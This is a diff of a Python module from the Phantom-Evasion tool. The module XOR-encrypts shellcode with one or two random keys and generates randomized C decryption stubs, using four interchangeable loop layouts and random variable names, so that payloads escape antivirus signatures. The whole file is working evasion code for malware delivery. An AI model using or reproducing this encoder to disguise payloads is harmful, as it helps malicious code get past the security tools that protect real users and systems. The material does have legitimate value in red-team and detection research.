@@ -1,91 +1,267 @@
-import os,sys
-import binascii
-import random,string
 
-def varname_creator():
-    varname = ""
-    Adam = random.randint(4,8)
-    Eve = random.randint(12,16)
-    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(random.randint(Adam,Eve)))
-    return varname
+     ########################################################################################
+     #                                                                                      #
+     #    This file is part of Phantom-Evasion.                                             #
+     #                                                                                      #
+     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
+     #    it under the terms of the GNU General Public License as published by              #
+     #    the Free Software Foundation, either version 3 of the License, or                 #
+     #    (at your option) any later version.                                               #
+     #                                                                                      #
+     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
+     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
+     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
+     #    GNU General Public License for more details.                                      #
+     #                                                                                      #
+     #    You should have received a copy of the GNU General Public License                 #
+     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
+     #                                                                                      #
+     ########################################################################################
      
-def xor_encryption(data,key):
-    flag = 0
-    shellcode = ""
-    keyarray=bytearray(key)
-    data_array=bytearray(data)
-    for b in data_array:
-        if flag == len(key)-1:
-            shellcode += bytearray([b^keyarray[flag] ]) 
-            flag = 0
-        else: 
-            shellcode += bytearray([b^keyarray[flag] ])
-            flag += 1
+
+import os,sys
+import random,string
+from time import sleep
+from Crypthelper import Printable
+from Crypthelper import KeyGen
+from Crypthelper import RandVarname
+from platform import python_version
+     
+def Xor(data,key):
+
+    while(len(key)<len(data)):
+
+        key = key*2 
+
+    if python_version()[0] == "2":
+
+        shellcode = ""
+        keyarray=bytearray(key)
+        data_array=bytearray(data)
+
+        for b in range(0,len(data_array)):
         
-    return shellcode
+            shellcode += bytearray([data_array[b]^keyarray[b]]) 
 
-def bad_char_inspector(data):
-    bad_char_detected=False
-    data=str(data)
-    for i in range(0,len(data)):
-        if ord(data[i]) == 0:
-            bad_char_detected=True
-        if ord(data[i]) == 10:
-            bad_char_detected=True
-        if ord(data[i]) == 13:
-            bad_char_detected=True
+        return shellcode
 
-    return bad_char_detected
+    else:
 
-def key_gen(keysize):
-    key=os.urandom(keysize)
-    check_bad_key=True
-    check_bad_key=bad_char_inspector(key)
-    while check_bad_key == True:
-        key=os.urandom(keysize)
-        check_bad_key=bad_char_inspector(key)
-    return key
-
-
-def Xor_stub2(shellcode,bufname):
-    keysize=random.randint(12,24)
-    key=key_gen(keysize)
-
-    encrypted_shellcode=xor_encryption(shellcode.decode('string-escape'),key)
-    check_bad_char=True
-    check_bad_char=bad_char_inspector(encrypted_shellcode)
-
-    while check_bad_char == True:
-        key=key_gen(keysize)
-        encrypted_shellcode=xor_encryption(shellcode.decode('string-escape'),key)
-        check_bad_char=bad_char_inspector(encrypted_shellcode)
-
-    encrypted_shellcode= binascii.hexlify(encrypted_shellcode)
-
-    printable_shellcode = ""
-    for i in range(0,len(encrypted_shellcode)-1,2):
-        printable_shellcode += "\\x" + encrypted_shellcode[i] + encrypted_shellcode [i+1]
-
-    key = binascii.hexlify(key)
-    printable_key = ""
-    for i in range(0,len(key)-1,2):
+        data=data.decode('unicode-escape').encode('latin-1')
         
-        printable_key += "\\x" + key[i] + key[i+1]
+        return bytes(x ^ y for x, y in zip(data,key[:len(data)]))
 
-    Randflag1 = varname_creator()
-    Randflag2 = varname_creator()
-    keyname = varname_creator()
+
+def XorEncrypt(shellcode,bufname,memptr=""):
+
+    key=KeyGen(random.randint(32,128))
+
+    if python_version()[0] == "2":
+
+        e_shell = Xor(shellcode.decode('string-escape'),key)
+    else:
+        e_shell = Xor(shellcode.encode('latin-1'),key) 
+        
+
+    p_shell = Printable(e_shell) 
+    p_key = Printable(key)
+
+    Randflag1 = RandVarname()
+    Randflag2 = RandVarname()
+    keyname = RandVarname()
 
     Xor_stub = ""
-    Xor_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
-    Xor_stub += "unsigned char " + keyname + " [] = \"" + printable_key + "\";\n"
-    Xor_stub += "unsigned char " + bufname + " [] = \"" + printable_shellcode + "\";\n"
-    Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < strlen(" + bufname + "); " + Randflag1 +"++){\n"
-    Xor_stub += "if(" + Randflag2 + " == strlen(" + keyname + ")-1){\n"
-    Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
-    Xor_stub += Randflag2 + " = 0;\n}" 
-    Xor_stub += "else{\n"
-    Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
-    Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"      
+
+    if "*$#FILE*" in bufname:
+        Flag=True
+        bufname=bufname.replace("*$#FILE*","")
+
+    Encoded_buffer = p_shell
+
+    bufname = memptr or bufname
+
+    #Encoded_buffer = "unsigned char " + bufname + "[] = {" + printable_shellcode.replace("\\x",",0x")[1:] + "};\n"
+
+
+    StubSelect = random.randint(1,4)
+
+    if StubSelect == 1:
+
+        Xor_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
+        Xor_stub += "unsigned char " + keyname + " [] = \"" + p_key + "\";\n"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < " + str(len(e_shell)) + "; " + Randflag1 +"++){\n"
+        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname + ")-2){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
+
+    if StubSelect == 2:
+
+        Xor_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
+        Xor_stub += "unsigned char " + keyname + " [] = \"" + p_key + "\";\n"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < " + str(len(e_shell)) + ";" + Randflag1 +"++){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "] = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
+        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname + ")-2){\n"
+        Xor_stub += Randflag2 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
+
+    if StubSelect == 3:
+
+        Xor_stub += "unsigned char " + keyname + " [] = \"" + p_key + "\";\n"
+        Xor_stub += "int " + Randflag1 + " = 0;\n"
+        Xor_stub += "int " + Randflag2 + " = 0;\n"
+        Xor_stub += "while(" + Randflag1 + " < " + str(len(e_shell)) + "){\n"
+        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname + ")-2){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
+        Xor_stub += Randflag1 + " +=1;}\n"
+
+    if StubSelect == 4:
+
+        Xor_stub += "unsigned char " + keyname + " [] = \"" + p_key + "\";\n"
+        Xor_stub += "int " + Randflag1 + " = 0;\n"
+        Xor_stub += "int " + Randflag2 + " = 0;\n"
+        Xor_stub += "while(" + Randflag1 + " < " + str(len(e_shell)) + "){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
+        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname + ")-2){\n"
+        Xor_stub += Randflag2 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
+        Xor_stub += Randflag1 + " +=1;}\n"
+
+    return (Encoded_buffer,Xor_stub)
+
+def DoubleKeyXorEncrypt(shellcode,bufname,memptr=""):
+
+    key1 = KeyGen(random.randint(32,128))
+    key2 = KeyGen(random.randint(32,128))
+
+    Realkey = Xor(key1,key2)
+
+    if python_version()[0] == "2":
+
+        e_shell = Xor(shellcode.decode('string-escape'),Realkey)
+    else:
+        e_shell = Xor(shellcode.encode('latin-1'),Realkey) 
+
+    p_shell = Printable(e_shell)
+    p_key1 = Printable(key1)
+    p_key2 = Printable(key2)
+
+    Randflag1 = RandVarname()
+    Randflag2 = RandVarname()
+    Randflag4 = RandVarname()
+    keyname1 = RandVarname()
+    keyname2 = RandVarname()
+    keynamestep1 = RandVarname()
+    keynamestep2 = RandVarname()
+
+    Xor_stub = ""
+
+    if "*$#FILE*" in bufname:
+        Flag=True
+        bufname=bufname.replace("*$#FILE*","")
+
+    Encoded_buffer = p_shell
     
-    return Xor_stub
+    bufname = memptr or bufname
+
+    StubSelect=random.randint(1,4)
+
+    if StubSelect == 1:
+
+        Xor_stub += "int " + Randflag1 + ";\n"
+        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
+        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + p_key1 + "\";\n"
+        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + p_key2 + "\";\n"
+        Xor_stub += "unsigned char " + keynamestep1 + " [sizeof(" + keyname1 + ")-1];\n"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < sizeof(" + keyname1 + ")-1; " + Randflag1 +"++){\n"
+        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname2 + ")-2){\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < " + str(len(e_shell)) + "; " + Randflag1 +"++){\n"
+        Xor_stub += "if(" + Randflag4 + " == sizeof(" + keyname1 + ")-2){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
+        Xor_stub += Randflag4 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
+        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}"  
+
+    if StubSelect == 2:
+
+        Xor_stub += "int " + Randflag1 + ";\n"
+        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
+        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + p_key2 + "\";\n"
+        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + p_key1 + "\";\n"
+        Xor_stub += "unsigned char " + keynamestep1 + " [sizeof(" + keyname1 + ")-1];\n"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < sizeof(" + keyname1 + ")-1; " + Randflag1 +"++){\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname2 + ")-2){\n"
+        Xor_stub += Randflag2 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
+        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < " + str(len(e_shell)) + "; " + Randflag1 +"++){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
+        Xor_stub += "if(" + Randflag4 + " == sizeof(" + keyname1 + ")-2){\n"
+        Xor_stub += Randflag4 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}" 
+
+    if StubSelect == 3:
+
+        Xor_stub += "int " + Randflag1 + " = 0;\n"
+        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
+        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + p_key1 + "\";\n"
+        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + p_key2 + "\";\n"
+        Xor_stub += "unsigned char " + keynamestep1 + " [sizeof(" + keyname1 + ")-1];\n"
+        Xor_stub += "while(" + Randflag1 + " < sizeof(" + keyname1 + ")-1){\n"
+        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname2 + ")-2){\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"
+        Xor_stub += Randflag1 + " = 0;\n"
+        Xor_stub += "while(" + Randflag1 + " < " + str(len(e_shell)) + "){\n"
+        Xor_stub += "if(" + Randflag4 + " == sizeof(" + keyname1 + ")-2){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
+        Xor_stub += Randflag4 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
+        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"   
+
+    if StubSelect == 4:
+
+        Xor_stub += "int " + Randflag1 + " = 0;\n"
+        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
+        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + p_key2 + "\";\n"
+        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + p_key1 + "\";\n"
+        Xor_stub += "unsigned char " + keynamestep1 + " [sizeof(" + keyname1 + ")-1];\n"
+        Xor_stub += "while(" + Randflag1 + " < sizeof(" + keyname1 + ")-1){\n"
+        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
+        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname2 + ")-2){\n"
+        Xor_stub += Randflag2 + " = 0;\n}"
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"
+        Xor_stub += Randflag1 + " = 0;\n"
+        Xor_stub += "while(" + Randflag1 + " < " + str(len(e_shell)) + "){\n"
+        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
+        Xor_stub += "if(" + Randflag4 + " == sizeof(" + keyname1 + ")-2){\n"
+        Xor_stub += Randflag4 + " = 0;\n}" 
+        Xor_stub += "else{\n"
+        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
+        Xor_stub += Randflag1 + " += 1;}\n"    
+ 
+    return (Encoded_buffer,Xor_stub)
